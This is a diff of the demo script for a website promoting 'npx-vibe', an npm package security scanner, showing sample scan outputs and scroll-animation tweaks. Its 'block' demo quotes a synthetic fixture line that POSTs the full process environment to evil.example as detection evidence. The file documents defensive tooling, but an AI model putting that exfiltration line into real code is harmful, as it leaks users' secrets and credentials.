@@ -1,117 +1,103 @@
 const demos = {
-  proceed: `$ npx npx-vibe --check is-number
-npx-vibe: Proceed  risk 0/100
-is-number@7.0.0
-Returns true if a number or string value is a finite number.
+  approve: `$ npx npx-vibe approve-scripts
+! npx-vibe approve-scripts: 2 need review
+my-app@1.0.0
 
-Downloads: 171,615,366/week  Package age: 4293d  Version age: 2911d
+Dependencies with install scripts: 4  Already allowed: 2
+Reviewed now: 2  approve 0  review 2  deny 0
+
+REVIEW   better-sqlite3@11.10.0
+  install: prebuild-install || node-gyp rebuild --release
+  Install scripts run commands that no automatic rule recognises.
+
+REVIEW   esbuild@0.28.2
+  postinstall: node install.js
+  network_and_shell: Code combines network access with shell execution.
+  Evidence install.js:147: function fetch(url) {
+    ... https.get(url, (res) => {
+  Evidence install.js:187: child_process.execSync(
+    \`npm install --loglevel=error ... \${pkg}@\${packageJSON.version}\`)
+
+No install script was executed during this review.
+2 package(s) need a human decision; --write never records those.`,
+
+  scan: `$ npx npx-vibe vite
+npx-vibe: Proceed  risk 5/100
+vite@7.1.7
+Native-ESM powered web dev build tool
+
+Downloads: 38,410,225/week  Package age: 2331d  Version age: 10d
+Known advisories: none found (OSV)
 Install hooks: none
-Inspected: 1 selected file from 4 package files
-Established signals: long registry history, high weekly adoption,
-multiple maintainers, linked GitHub repository
-Review memory: first local scan of this package integrity.
-AI review: skipped (No heuristic trigger required model review.)
-
-Action: package may be executed.`,
-
-  caution: `$ npx npx-vibe --check esbuild
-! npx-vibe: Caution  risk 43/100
-esbuild@0.28.1
-An extremely fast JavaScript and CSS bundler and minifier.
-
-Downloads: 241,858,907/week  Package age: 3132d  Version age: 12d
-Install hooks: postinstall
-Inspected: 3 selected files from 7 package files
+Inspected: 4 selected files from 36 package files
 Established signals: long registry history, high weekly adoption,
 linked GitHub repository
-Review memory: unchanged tarball since 2026-06-25; previous Caution 43/100.
-AI review: skipped (Heuristic-only mode; AI was not requested.)
+
+Registry context (not scored):
+- young_version: This version was published 10 days ago.
+
+Action: nothing blocking found. Run it with: npx-vibe run vite`,
+
+  advisory: `$ npx npx-vibe lodash@4.17.15
+! npx-vibe: Caution  risk 55/100
+lodash@4.17.15
+
+Known advisories: 6 (OSV)
+Install hooks: none
 
 Findings:
-- LOW      young_version
-  This version was published 12 days ago.
-- MEDIUM   lifecycle_hook in package.json
-  postinstall runs: node install.js
-  Evidence: postinstall: node install.js
-- MEDIUM   network_and_shell in install.js
-  Code combines network access with shell execution.
-  Evidence line 147: function fetch(url) { ... https.get(url ...
-  Evidence line 187: child_process.execSync("npm install ...")
+- HIGH     known_vulnerability
+  6 known advisories for lodash@4.17.15:
+  GHSA-35jh-r3h4-6jhm (CVE-2021-23337) HIGH;
+  GHSA-p6mc-m468-83gw (CVE-2020-8203) HIGH; and 4 more.
+  Evidence: Command Injection in lodash
 
-Action: review recommended before execution.`,
+Action: read the evidence above before running this package.`,
 
-  ai: `$ npx npx-vibe --check --ai online \\
-  --provider gemini --model-profile balanced esbuild
-! npx-vibe: Caution  risk 43/100
-esbuild@0.28.1
-
-Install hooks: postinstall
-Inspected: 3 selected files from 7 package files
-Review memory: unchanged tarball since 2026-06-25; previous Caution 43/100.
-AI review: Gemini gemini-3.5-flash [balanced] (high confidence)
-AI evidence: 0 source-backed findings
-
-AI interpretation: The selected install script appears to resolve a
-platform-specific binary. No additional source-backed credential access,
-obfuscation, or persistence finding was identified, but deterministic
-install-time network and process evidence remains.
-
-Action: review recommended before execution.`,
-
-  agent: `$ npx --yes npx-vibe@latest --agent esbuild
+  agent: `$ npx npx-vibe --agent esbuild
 {
-  "schemaVersion": 1,
-  "tool": { "name": "npx-vibe", "version": "1.5.1" },
+  "schemaVersion": 2,
+  "tool": { "name": "npx-vibe", "version": "2.0.0" },
   "kind": "package-scan",
   "status": "complete",
   "decision": {
     "verdict": "caution",
-    "riskScore": 43,
+    "riskScore": 42,
     "action": "review",
     "exitCode": 2,
     "mayContinue": false,
     "safeToExecute": false,
     "requiresApproval": true,
-    "requiresHumanReview": true,
     "blocked": false,
     "mustStop": false
-  },
-  "subject": {
-    "type": "package",
-    "name": "esbuild",
-    "requested": "latest",
-    "version": "0.28.1"
-  },
-  "report": {
-    "findings": [
-      { "code": "lifecycle_hook", "file": "package.json" },
-      { "code": "network_and_shell", "file": "install.js" }
-    ]
   }
 }`,
 
-  block: `# Synthetic malicious fixture from the npx-vibe test suite
-x npx-vibe: Block  risk 100/100
+  block: `$ npx npx-vibe sketchy-package
+npx-vibe: Block  risk 100/100
 fixture: install-time secret exfiltration
 
 Install hooks: postinstall
 
 Findings:
 - CRITICAL possible_secret_exfiltration in postinstall.js
-  Code appears to access environment/secrets and perform network activity.
+  Code reads environment/secrets and sends data over the
+  network from the same code path.
   Evidence line 1: fetch("https://evil.example/collect",
   { method: "POST", body: JSON.stringify(process.env) })
 
-Action: blocked unless --force is supplied.`
+Action: blocked. npx-vibe run sketchy-package --force
+overrides this deliberately.`
 };
 
 const demoMeta = {
-  proceed: "A typical clean package scan. No API key, model, or package execution is involved.",
-  caution: "A real package with install-time behavior. Popularity provides context, but evidence still drives the recommendation.",
-  ai: "Optional AI adds interpretation when requested. Deterministic findings remain the source of truth.",
+  approve: "npm 12 blocks install scripts until you allow them. This is the review that tells you which ones deserve it, with the source line behind each decision.",
+  scan: "The default command reviews and exits. Age and adoption are shown as context and never move the score.",
+  advisory: "Known advisories come from OSV with no API key. A published CVE raises Caution; it never forces a Block on its own.",
   agent: "Agent mode returns schema-versioned JSON, disables local history writes, and pauses the workflow on Caution.",
-  block: "Synthetic test fixture used to demonstrate a high-confidence block recommendation.",
+  block: "A synthetic fixture. Critical findings require the secret read and the network call to sit on the same code path.",
 };
+
 
 const output = document.querySelector("#demo-output");
 const note = document.querySelector("#demo-note");
@@ -173,18 +159,22 @@ window.addEventListener("scroll", updateHeader, { passive: true });
 
 const revealItems = [...document.querySelectorAll("[data-reveal]")];
 
-if (reduceMotion || !("IntersectionObserver" in window)) {
-  revealItems.forEach((item) => item.classList.add("is-visible"));
-} else {
+if (!reduceMotion && "IntersectionObserver" in window && revealItems.length) {
+  // Only hide content once we know we can reveal it again. If this script fails
+  // to load, nothing is ever hidden and the page reads normally.
+  document.documentElement.classList.add("reveal-on");
+
   const revealObserver = new IntersectionObserver(
     (entries, observer) => {
       entries.forEach((entry) => {
-        if (!entry.isIntersecting) return;
+        // A fast scroll can take an element from below the fold to above it
+        // between frames, so anything already past the top counts as seen.
+        if (!entry.isIntersecting && entry.boundingClientRect.top > 0) return;
         entry.target.classList.add("is-visible");
         observer.unobserve(entry.target);
       });
     },
-    { rootMargin: "0px 0px -10% 0px", threshold: 0.08 },
+    { rootMargin: "0px 0px -8% 0px", threshold: 0 },
   );
 
   revealItems.forEach((item) => revealObserver.observe(item));
